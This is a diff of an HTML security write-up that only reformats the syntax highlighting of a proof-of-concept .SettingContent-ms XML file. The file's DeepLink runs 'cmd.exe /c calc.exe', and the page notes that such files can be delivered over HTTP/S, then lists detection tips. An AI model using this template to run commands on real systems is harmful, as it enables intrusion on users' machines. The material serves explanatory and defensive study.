@@ -189,26 +189,26 @@
 <li>Poisoned <code>.SettingContent-ms</code> files can be delivered via HTTP/S, execution without notification and warning to users.</li>
 <li>Max character size allowed on <code>&lt;DeepLink&gt;</code> tag is 517 characeters.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!-- From https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8 --&gt;</span>
-<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
-<span style="color:#f92672">&lt;PCSettings&gt;</span>
-  <span style="color:#f92672">&lt;SearchableContent</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/Search/2013/SettingContent&#34;</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;ApplicationInformation&gt;</span>
-      <span style="color:#f92672">&lt;AppID&gt;</span>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel<span style="color:#f92672">&lt;/AppID&gt;</span>
-      <span style="color:#f92672">&lt;DeepLink&gt;</span>%windir%\system32\cmd.exe /c calc.exe<span style="color:#f92672">&lt;/DeepLink&gt;</span>
-      <span style="color:#f92672">&lt;Icon&gt;</span>%windir%\system32\control.exe<span style="color:#f92672">&lt;/Icon&gt;</span>
-    <span style="color:#f92672">&lt;/ApplicationInformation&gt;</span>
-    <span style="color:#f92672">&lt;SettingIdentity&gt;</span>
-      <span style="color:#f92672">&lt;PageID&gt;&lt;/PageID&gt;</span>
-      <span style="color:#f92672">&lt;HostID&gt;</span>host_id<span style="color:#f92672">&lt;/HostID&gt;</span>
-    <span style="color:#f92672">&lt;/SettingIdentity&gt;</span>
-    <span style="color:#f92672">&lt;SettingInformation&gt;</span>
-      <span style="color:#f92672">&lt;Description&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Description&gt;</span>
-      <span style="color:#f92672">&lt;Keywords&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Keywords&gt;</span>
-    <span style="color:#f92672">&lt;/SettingInformation&gt;</span>
-  <span style="color:#f92672">&lt;/SearchableContent&gt;</span>
-<span style="color:#f92672">&lt;/PCSettings&gt;</span>
-</code></pre></div><h2 id="detectionprevention">Detection/Prevention</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- From https://gist.github.com/enigma0x3/b948b81717fd6b72e0a4baca033e07f8 --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;PCSettings&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;SearchableContent</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://schemas.microsoft.com/Search/2013/SettingContent&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ApplicationInformation&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;AppID&gt;</span>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel<span style="color:#f92672">&lt;/AppID&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;DeepLink&gt;</span>%windir%\system32\cmd.exe /c calc.exe<span style="color:#f92672">&lt;/DeepLink&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Icon&gt;</span>%windir%\system32\control.exe<span style="color:#f92672">&lt;/Icon&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/ApplicationInformation&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;SettingIdentity&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;PageID&gt;&lt;/PageID&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;HostID&gt;</span>host_id<span style="color:#f92672">&lt;/HostID&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/SettingIdentity&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;SettingInformation&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Description&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Description&gt;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;Keywords&gt;</span>@shell32.dll,-4161<span style="color:#f92672">&lt;/Keywords&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/SettingInformation&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/SearchableContent&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/PCSettings&gt;</span>
+</span></span></code></pre></div><h2 id="detectionprevention">Detection/Prevention</h2>
 <ul>
 <li>Monitor an execution of child processes from Office applications</li>
 <li>Look for existing of <code>.SettingContent-ms outside </code>C:\Windows\ImmersiveControlPanel`</li>
